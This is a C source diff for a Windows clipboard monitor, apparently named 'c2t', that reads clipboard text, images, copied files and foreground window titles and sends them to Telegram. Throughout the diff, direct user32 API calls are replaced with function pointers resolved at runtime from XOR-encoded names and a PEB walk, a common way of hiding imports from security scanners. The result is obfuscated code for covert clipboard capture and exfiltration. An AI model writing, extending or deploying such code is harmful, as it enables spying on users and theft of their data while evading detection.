@@ -41,6 +41,51 @@ typedef struct {
 
 typedef DWORD(WINAPI *pfn_GetWindowThreadProcessId)(HWND hWnd,
                                                     LPDWORD lpdwProcessId);
+typedef BOOL(WINAPI *pfn_OpenClipboard)(HWND hWndNewOwner);
+typedef BOOL(WINAPI *pfn_CloseClipboard)(VOID);
+typedef HANDLE(WINAPI *pfn_GetClipboardData)(UINT uFormat);
+typedef BOOL(WINAPI *pfn_IsClipboardFormatAvailable)(UINT format);
+typedef BOOL(WINAPI *pfn_AddClipboardFormatListener)(HWND hwnd);
+typedef BOOL(WINAPI *pfn_RemoveClipboardFormatListener)(HWND hwnd);
+typedef HWND(WINAPI *pfn_GetForegroundWindow)(VOID);
+typedef int(WINAPI *pfn_GetWindowTextW)(HWND hWnd, LPWSTR lpString, int nMaxCount);
+typedef HWND(WINAPI *pfn_CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName,
+                                          LPCWSTR lpWindowName, DWORD dwStyle,
+                                          int X, int Y, int nWidth, int nHeight,
+                                          HWND hWndParent, HMENU hMenu,
+                                          HINSTANCE hInstance, LPVOID lpParam);
+typedef BOOL(WINAPI *pfn_DestroyWindow)(HWND hWnd);
+typedef ATOM(WINAPI *pfn_RegisterClassW)(const WNDCLASSW *lpWndClass);
+typedef BOOL(WINAPI *pfn_UnregisterClassW)(LPCWSTR lpClassName, HINSTANCE hInstance);
+typedef LRESULT(WINAPI *pfn_DefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam,
+                                            LPARAM lParam);
+typedef BOOL(WINAPI *pfn_PeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
+                                       UINT wMsgFilterMax, UINT wRemoveMsg);
+typedef BOOL(WINAPI *pfn_TranslateMessage)(const MSG *lpMsg);
+typedef LRESULT(WINAPI *pfn_DispatchMessageW)(const MSG *lpMsg);
+
+typedef struct {
+  pfn_GetWindowThreadProcessId GetWindowThreadProcessId;
+  pfn_OpenClipboard OpenClipboard;
+  pfn_CloseClipboard CloseClipboard;
+  pfn_GetClipboardData GetClipboardData;
+  pfn_IsClipboardFormatAvailable IsClipboardFormatAvailable;
+  pfn_AddClipboardFormatListener AddClipboardFormatListener;
+  pfn_RemoveClipboardFormatListener RemoveClipboardFormatListener;
+  pfn_GetForegroundWindow GetForegroundWindow;
+  pfn_GetWindowTextW GetWindowTextW;
+  pfn_CreateWindowExW CreateWindowExW;
+  pfn_DestroyWindow DestroyWindow;
+  pfn_RegisterClassW RegisterClassW;
+  pfn_UnregisterClassW UnregisterClassW;
+  pfn_DefWindowProcW DefWindowProcW;
+  pfn_PeekMessageW PeekMessageW;
+  pfn_TranslateMessage TranslateMessage;
+  pfn_DispatchMessageW DispatchMessageW;
+} c2t_user32_api_t;
+
+static c2t_user32_api_t g_user32 = {0};
+static int g_user32_initialized = 0;
 
 static inline void c2t_xor_decode_cb(char *dest, const unsigned char *src,
                                      size_t len, unsigned char key) {
@@ -113,28 +158,216 @@ static HMODULE c2t_get_module_handle_peb(const wchar_t *module_name) {
   return nullptr;
 }
 
-static DWORD c2t_GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId) {
-  static pfn_GetWindowThreadProcessId p_func = nullptr;
-  if (!p_func) {
-    static const unsigned char enc_u32[] = {47,  41,  63, 40, 105,
-                                            104, 116, 62, 54, 54};
-    static const unsigned char enc_fn[] = {29, 63, 46, 13, 51, 52, 62, 53,
-                                           45, 14, 50, 40, 63, 59, 62, 10,
-                                           40, 53, 57, 63, 41, 41, 19, 62};
-    char u32_buf[16];
-    char fn_buf[32];
-    c2t_xor_decode_cb(u32_buf, enc_u32, sizeof(enc_u32), 0x5A);
-    c2t_xor_decode_cb(fn_buf, enc_fn, sizeof(enc_fn), 0x5A);
-    HMODULE hUser32 = c2t_get_module_handle_peb(L"user32.dll");
-    if (!hUser32)
-      hUser32 = GetModuleHandleA(u32_buf);
-    if (hUser32) {
-      FARPROC proc = GetProcAddress(hUser32, fn_buf);
-      memcpy(&p_func, &proc, sizeof(p_func));
-    }
+static void c2t_init_user32_apis(void) {
+  if (g_user32_initialized)
+    return;
+
+  static const unsigned char enc_u32[] = {47, 41, 63, 40, 105, 104, 116, 62, 54, 54};
+  char u32_buf[16];
+  c2t_xor_decode_cb(u32_buf, enc_u32, sizeof(enc_u32), 0x5A);
+
+  HMODULE hUser32 = c2t_get_module_handle_peb(L"user32.dll");
+  if (!hUser32)
+    hUser32 = GetModuleHandleA(u32_buf);
+  if (!hUser32)
+    hUser32 = LoadLibraryA(u32_buf);
+
+  if (hUser32) {
+#define LOAD_USER32_API(name, enc_arr)                                         \
+    do {                                                                       \
+      char fn_buf[64];                                                         \
+      c2t_xor_decode_cb(fn_buf, enc_arr, sizeof(enc_arr), 0x5A);               \
+      FARPROC proc = GetProcAddress(hUser32, fn_buf);                          \
+      memcpy(&g_user32.name, &proc, sizeof(g_user32.name));                   \
+    } while (0)
+
+    static const unsigned char enc_GetWindowThreadProcessId[] = {
+        29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40,
+        63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
+    static const unsigned char enc_OpenClipboard[] = {
+        21, 42, 63, 52, 25, 54, 51, 42, 56, 53, 59, 40, 62};
+    static const unsigned char enc_CloseClipboard[] = {
+        25, 54, 53, 41, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62};
+    static const unsigned char enc_GetClipboardData[] = {
+        29, 63, 46, 25, 54, 51, 42, 56, 53, 59, 40, 62, 30, 59, 46, 59};
+    static const unsigned char enc_IsClipboardFormatAvailable[] = {
+        19, 41, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53,
+        40, 55, 59, 46, 27, 44, 59, 51, 54, 59, 56, 54, 63};
+    static const unsigned char enc_AddClipboardFormatListener[] = {
+        27, 62, 62, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53,
+        40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
+    static const unsigned char enc_RemoveClipboardFormatListener[] = {
+        8,  63, 55, 53, 44, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62,
+        28, 53, 40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
+    static const unsigned char enc_GetForegroundWindow[] = {
+        29, 63, 46, 28, 53, 40, 63, 61, 40, 53, 47, 52, 62, 13, 51, 52, 62, 53, 45};
+    static const unsigned char enc_GetWindowTextW[] = {
+        29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 63, 34, 46, 13};
+    static const unsigned char enc_CreateWindowExW[] = {
+        25, 40, 63, 59, 46, 63, 13, 51, 52, 62, 53, 45, 31, 34, 13};
+    static const unsigned char enc_DestroyWindow[] = {
+        30, 63, 41, 46, 40, 53, 35, 13, 51, 52, 62, 53, 45};
+    static const unsigned char enc_RegisterClassW[] = {
+        8, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
+    static const unsigned char enc_UnregisterClassW[] = {
+        15, 52, 40, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
+    static const unsigned char enc_DefWindowProcW[] = {
+        30, 63, 60, 13, 51, 52, 62, 53, 45, 10, 40, 53, 57, 13};
+    static const unsigned char enc_PeekMessageW[] = {
+        10, 63, 63, 49, 23, 63, 41, 41, 59, 61, 63, 13};
+    static const unsigned char enc_TranslateMessage[] = {
+        14, 40, 59, 52, 41, 54, 59, 46, 63, 23, 63, 41, 41, 59, 61, 63};
+    static const unsigned char enc_DispatchMessageW[] = {
+        30, 51, 41, 42, 59, 46, 57, 50, 23, 63, 41, 41, 59, 61, 63, 13};
+
+    LOAD_USER32_API(GetWindowThreadProcessId, enc_GetWindowThreadProcessId);
+    LOAD_USER32_API(OpenClipboard, enc_OpenClipboard);
+    LOAD_USER32_API(CloseClipboard, enc_CloseClipboard);
+    LOAD_USER32_API(GetClipboardData, enc_GetClipboardData);
+    LOAD_USER32_API(IsClipboardFormatAvailable, enc_IsClipboardFormatAvailable);
+    LOAD_USER32_API(AddClipboardFormatListener, enc_AddClipboardFormatListener);
+    LOAD_USER32_API(RemoveClipboardFormatListener, enc_RemoveClipboardFormatListener);
+    LOAD_USER32_API(GetForegroundWindow, enc_GetForegroundWindow);
+    LOAD_USER32_API(GetWindowTextW, enc_GetWindowTextW);
+    LOAD_USER32_API(CreateWindowExW, enc_CreateWindowExW);
+    LOAD_USER32_API(DestroyWindow, enc_DestroyWindow);
+    LOAD_USER32_API(RegisterClassW, enc_RegisterClassW);
+    LOAD_USER32_API(UnregisterClassW, enc_UnregisterClassW);
+    LOAD_USER32_API(DefWindowProcW, enc_DefWindowProcW);
+    LOAD_USER32_API(PeekMessageW, enc_PeekMessageW);
+    LOAD_USER32_API(TranslateMessage, enc_TranslateMessage);
+    LOAD_USER32_API(DispatchMessageW, enc_DispatchMessageW);
+#undef LOAD_USER32_API
   }
-  if (p_func)
-    return p_func(hWnd, lpdwProcessId);
+
+  g_user32_initialized = 1;
+}
+
+static DWORD c2t_GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId) {
+  c2t_init_user32_apis();
+  if (g_user32.GetWindowThreadProcessId)
+    return g_user32.GetWindowThreadProcessId(hWnd, lpdwProcessId);
+  return 0;
+}
+
+static BOOL c2t_OpenClipboard(HWND hWndNewOwner) {
+  c2t_init_user32_apis();
+  if (g_user32.OpenClipboard)
+    return g_user32.OpenClipboard(hWndNewOwner);
+  return FALSE;
+}
+
+static BOOL c2t_CloseClipboard(VOID) {
+  c2t_init_user32_apis();
+  if (g_user32.CloseClipboard)
+    return g_user32.CloseClipboard();
+  return FALSE;
+}
+
+static HANDLE c2t_GetClipboardData(UINT uFormat) {
+  c2t_init_user32_apis();
+  if (g_user32.GetClipboardData)
+    return g_user32.GetClipboardData(uFormat);
+  return NULL;
+}
+
+static BOOL c2t_IsClipboardFormatAvailable(UINT format) {
+  c2t_init_user32_apis();
+  if (g_user32.IsClipboardFormatAvailable)
+    return g_user32.IsClipboardFormatAvailable(format);
+  return FALSE;
+}
+
+static BOOL c2t_AddClipboardFormatListener(HWND hwnd) {
+  c2t_init_user32_apis();
+  if (g_user32.AddClipboardFormatListener)
+    return g_user32.AddClipboardFormatListener(hwnd);
+  return FALSE;
+}
+
+static BOOL c2t_RemoveClipboardFormatListener(HWND hwnd) {
+  c2t_init_user32_apis();
+  if (g_user32.RemoveClipboardFormatListener)
+    return g_user32.RemoveClipboardFormatListener(hwnd);
+  return FALSE;
+}
+
+static HWND c2t_GetForegroundWindow(VOID) {
+  c2t_init_user32_apis();
+  if (g_user32.GetForegroundWindow)
+    return g_user32.GetForegroundWindow();
+  return NULL;
+}
+
+static int c2t_GetWindowTextW(HWND hWnd, LPWSTR lpString, int nMaxCount) {
+  c2t_init_user32_apis();
+  if (g_user32.GetWindowTextW)
+    return g_user32.GetWindowTextW(hWnd, lpString, nMaxCount);
+  return 0;
+}
+
+static HWND c2t_CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName,
+                                LPCWSTR lpWindowName, DWORD dwStyle, int X,
+                                int Y, int nWidth, int nHeight, HWND hWndParent,
+                                HMENU hMenu, HINSTANCE hInstance,
+                                LPVOID lpParam) {
+  c2t_init_user32_apis();
+  if (g_user32.CreateWindowExW)
+    return g_user32.CreateWindowExW(dwExStyle, lpClassName, lpWindowName,
+                                    dwStyle, X, Y, nWidth, nHeight, hWndParent,
+                                    hMenu, hInstance, lpParam);
+  return NULL;
+}
+
+static BOOL c2t_DestroyWindow(HWND hWnd) {
+  c2t_init_user32_apis();
+  if (g_user32.DestroyWindow)
+    return g_user32.DestroyWindow(hWnd);
+  return FALSE;
+}
+
+static ATOM c2t_RegisterClassW(const WNDCLASSW *lpWndClass) {
+  c2t_init_user32_apis();
+  if (g_user32.RegisterClassW)
+    return g_user32.RegisterClassW(lpWndClass);
+  return 0;
+}
+
+static BOOL c2t_UnregisterClassW(LPCWSTR lpClassName, HINSTANCE hInstance) {
+  c2t_init_user32_apis();
+  if (g_user32.UnregisterClassW)
+    return g_user32.UnregisterClassW(lpClassName, hInstance);
+  return FALSE;
+}
+
+static LRESULT c2t_DefWindowProcW(HWND hWnd, UINT Msg, WPARAM wParam,
+                                  LPARAM lParam) {
+  c2t_init_user32_apis();
+  if (g_user32.DefWindowProcW)
+    return g_user32.DefWindowProcW(hWnd, Msg, wParam, lParam);
+  return 0;
+}
+
+static BOOL c2t_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
+                             UINT wMsgFilterMax, UINT wRemoveMsg) {
+  c2t_init_user32_apis();
+  if (g_user32.PeekMessageW)
+    return g_user32.PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax,
+                                 wRemoveMsg);
+  return FALSE;
+}
+
+static BOOL c2t_TranslateMessage(const MSG *lpMsg) {
+  c2t_init_user32_apis();
+  if (g_user32.TranslateMessage)
+    return g_user32.TranslateMessage(lpMsg);
+  return FALSE;
+}
+
+static LRESULT c2t_DispatchMessageW(const MSG *lpMsg) {
+  c2t_init_user32_apis();
+  if (g_user32.DispatchMessageW)
+    return g_user32.DispatchMessageW(lpMsg);
   return 0;
 }
 
@@ -165,13 +398,13 @@ static void wide_to_utf8(const wchar_t *wide, char *output, size_t capacity) {
   if (!c2t_config_get()->telegram_send_window_info)
     return 0;
 
-  HWND source_window = GetForegroundWindow();
+  HWND source_window = c2t_GetForegroundWindow();
   if (!source_window)
     return 0;
 
   wchar_t title[512] = {};
-  int title_length = GetWindowTextW(source_window, title,
-                                    (int)(sizeof(title) / sizeof(title[0])));
+  int title_length = c2t_GetWindowTextW(source_window, title,
+                                     (int)(sizeof(title) / sizeof(title[0])));
   if (title_length > 0)
     wide_to_utf8(title, source->title, sizeof(source->title));
 
@@ -214,7 +447,7 @@ static void write_u32_le(unsigned char *output, uint32_t value) {
 [[nodiscard]] static int output_bitmap(UINT format,
                                        const c2t_clipboard_source_t *source) {
   c2t_log_debug("windows", "Reading bitmap clipboard format %u", format);
-  HANDLE handle = GetClipboardData(format);
+  HANDLE handle = c2t_GetClipboardData(format);
   const BITMAPINFOHEADER *info = handle ? GlobalLock(handle) : nullptr;
   SIZE_T dib_size = handle ? GlobalSize(handle) : 0;
   if (!info || dib_size < sizeof(BITMAPINFOHEADER) ||
@@ -275,7 +508,7 @@ static void write_u32_le(unsigned char *output, uint32_t value) {
 
 static void output_text(const c2t_clipboard_source_t *source) {
   c2t_log_debug("windows", "Reading Unicode text from clipboard");
-  HANDLE handle = GetClipboardData(CF_UNICODETEXT);
+  HANDLE handle = c2t_GetClipboardData(CF_UNICODETEXT);
 
   const wchar_t *wide_text = handle ? GlobalLock(handle) : nullptr;
   SIZE_T byte_size = handle ? GlobalSize(handle) : 0;
@@ -335,7 +568,7 @@ output_wide_file(const wchar_t *wide, int wide_length,
 }
 
 [[nodiscard]] static int output_files(const c2t_clipboard_source_t *source) {
-  HANDLE handle = GetClipboardData(CF_HDROP);
+  HANDLE handle = c2t_GetClipboardData(CF_HDROP);
   const c2t_dropfiles_t *drop = handle ? GlobalLock(handle) : nullptr;
   SIZE_T total_size = handle ? GlobalSize(handle) : 0;
   if (!drop || total_size < sizeof(*drop) || drop->files_offset >= total_size) {
@@ -394,7 +627,7 @@ static void output_clipboard(void) {
       capture_source(&source) ? &source : nullptr;
   int opened = 0;
   for (unsigned int attempt = 0; attempt < 5 && !opened; ++attempt) {
-    opened = OpenClipboard(nullptr);
+    opened = c2t_OpenClipboard(nullptr);
     if (!opened && attempt < 4)
       Sleep(10U << attempt);
   }
@@ -406,18 +639,18 @@ static void output_clipboard(void) {
 
   int handled = 0;
   if (c2t_config_get()->telegram_send_files &&
-      IsClipboardFormatAvailable(CF_HDROP))
+      c2t_IsClipboardFormatAvailable(CF_HDROP))
     handled = output_files(source_pointer);
 #ifdef CF_DIBV5
-  if (!handled && IsClipboardFormatAvailable(CF_DIBV5))
+  if (!handled && c2t_IsClipboardFormatAvailable(CF_DIBV5))
     handled = output_bitmap(CF_DIBV5, source_pointer);
 #endif
-  if (!handled && IsClipboardFormatAvailable(CF_DIB))
+  if (!handled && c2t_IsClipboardFormatAvailable(CF_DIB))
     handled = output_bitmap(CF_DIB, source_pointer);
-  if (!handled && IsClipboardFormatAvailable(CF_UNICODETEXT))
+  if (!handled && c2t_IsClipboardFormatAvailable(CF_UNICODETEXT))
     output_text(source_pointer);
 
-  CloseClipboard();
+  c2t_CloseClipboard();
 }
 
 static LRESULT CALLBACK window_callback(HWND window, UINT message,
@@ -428,7 +661,7 @@ static LRESULT CALLBACK window_callback(HWND window, UINT message,
     return 0;
   }
 
-  return DefWindowProcW(window, message, wparam, lparam);
+  return c2t_DefWindowProcW(window, message, wparam, lparam);
 }
 
 static int clipboard_listen_once(void) {
@@ -439,27 +672,27 @@ static int clipboard_listen_once(void) {
                             .hInstance = instance,
                             .lpszClassName = class_name};
 
-  if (!RegisterClassW(&window_class)) {
+  if (!c2t_RegisterClassW(&window_class)) {
     c2t_log_error("windows",
                   "Unable to register clipboard listener (error %lu)",
                   (unsigned long)GetLastError());
     return 1;
   }
 
-  HWND window = CreateWindowExW(0, class_name, L"", 0, 0, 0, 0, 0, HWND_MESSAGE,
+  HWND window = c2t_CreateWindowExW(0, class_name, L"", 0, 0, 0, 0, 0, HWND_MESSAGE,
                                 nullptr, instance, nullptr);
   if (!window) {
     c2t_log_error("windows", "Unable to create clipboard listener (error %lu)",
                   (unsigned long)GetLastError());
-    UnregisterClassW(class_name, instance);
+    c2t_UnregisterClassW(class_name, instance);
     return 1;
   }
 
-  if (!AddClipboardFormatListener(window)) {
+  if (!c2t_AddClipboardFormatListener(window)) {
     c2t_log_error("windows", "Unable to listen to clipboard (error %lu)",
                   (unsigned long)GetLastError());
-    DestroyWindow(window);
-    UnregisterClassW(class_name, instance);
+    c2t_DestroyWindow(window);
+    c2t_UnregisterClassW(class_name, instance);
     return 1;
   }
 
@@ -468,19 +701,19 @@ static int clipboard_listen_once(void) {
   MSG message = {};
   int result = 0;
   while (!c2t_runtime_stop_requested()) {
-    while (PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE)) {
+    while (c2t_PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE)) {
       if (message.message == WM_QUIT)
         goto message_loop_finished;
-      TranslateMessage(&message);
-      DispatchMessageW(&message);
+      c2t_TranslateMessage(&message);
+      c2t_DispatchMessageW(&message);
     }
     Sleep(100);
   }
 
 message_loop_finished:
-  RemoveClipboardFormatListener(window);
-  DestroyWindow(window);
-  UnregisterClassW(class_name, instance);
+  c2t_RemoveClipboardFormatListener(window);
+  c2t_DestroyWindow(window);
+  c2t_UnregisterClassW(class_name, instance);
   return result == 0 ? 0 : 2;
 }
 
